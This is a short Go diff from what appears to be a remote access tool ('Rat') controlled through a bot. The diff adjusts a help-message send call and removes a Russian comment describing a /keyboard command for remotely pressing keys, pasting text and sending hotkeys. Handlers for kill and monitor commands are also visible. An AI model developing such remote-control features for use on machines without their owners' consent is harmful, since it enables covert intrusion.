@@ -15,7 +15,7 @@ func (r *Rat) defaultCmd() {
 }
 
 func (r *Rat) helpCmd() {
-	r.Bot.Send(helpText)
+	r.Bot.Send("%s", helpText)
 }
 
 func (r *Rat) killCmd() {
@@ -64,12 +64,6 @@ func (r *Rat) monitorCmd(args string) {
 	}
 }
 
-/*
-/keyboard [press|paste|hotkey] STRING
-press - нажатие клавиши
-paste - вставка текста
-hotkey - нажатие хоткея
-*/
 func (r *Rat) keyboardCmd(args string) {
 	cmd, arg := bot.ParseCommand(args)
 
